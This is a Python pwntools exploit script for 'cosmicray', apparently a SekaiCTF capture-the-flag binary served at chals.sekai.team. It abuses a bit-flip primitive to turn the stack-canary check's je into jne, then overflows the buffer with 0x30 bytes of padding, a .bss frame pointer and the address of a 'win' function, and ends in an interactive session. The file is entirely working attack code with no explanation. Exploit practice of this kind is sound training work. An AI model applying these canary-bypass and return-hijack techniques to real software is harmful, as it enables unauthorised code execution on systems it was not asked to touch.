#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./cosmicray", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc chals.sekai.team 4077"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

"""
0x00000000004016e7 <+158>:   mov    rdx,QWORD PTR [rbp-0x8]
0x00000000004016eb <+162>:   sub    rdx,QWORD PTR fs:0x28
0x00000000004016f4 <+171>:   je     0x4016fb <main+178>
0x00000000004016f6 <+173>:   call   0x401130 <__stack_chk_fail@plt>
0x00000000004016fb <+178>:   leave
0x00000000004016fc <+179>:   ret
"""

canary_jz = b"0x4016f4"

# patch je (0x74) to jne (0x75) (http://ref.x86asm.net/coder64.html)
io.sendlineafter(b"it:\n", canary_jz)
io.sendlineafter(b"):", b"7")

payload = b"A" * 0x30
payload += p64(elf.bss(0x400))
payload += p64(elf.symbols["win"])
io.sendlineafter(b"today:", payload)

io.interactive()
